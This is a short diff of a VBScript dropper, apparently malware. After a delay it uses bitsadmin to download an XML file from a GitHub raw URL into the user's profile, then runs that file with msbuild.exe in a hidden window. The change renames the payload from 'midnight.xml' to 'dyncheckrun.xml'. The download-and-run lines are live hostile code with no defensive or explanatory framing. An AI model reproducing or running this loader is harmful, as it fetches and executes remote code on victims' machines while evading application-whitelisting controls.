@@ -22,7 +22,7 @@ WScript.Sleep 30000
 
 
 
-objShell.run("bitsadmin /transfer wcb /priority high https://raw.githubusercontent.com/shadowbrokerman/testing/master/midnight.xml %USERPROFILE%\midnight.xml"), 0, True
+objShell.run("bitsadmin /transfer wcb /priority high https://raw.githubusercontent.com/shadowbrokerman/testing/master/dyncheckrun.xml %USERPROFILE%\dyncheckrun.xml"), 0, True
 
 
 
@@ -30,7 +30,7 @@ WScript.Sleep 30000
 
 
 
-objShell.run("%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe %USERPROFILE%\midnight.xml"), 0, False
+objShell.run("%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe %USERPROFILE%\dyncheckrun.xml"), 0, False
 
 
 
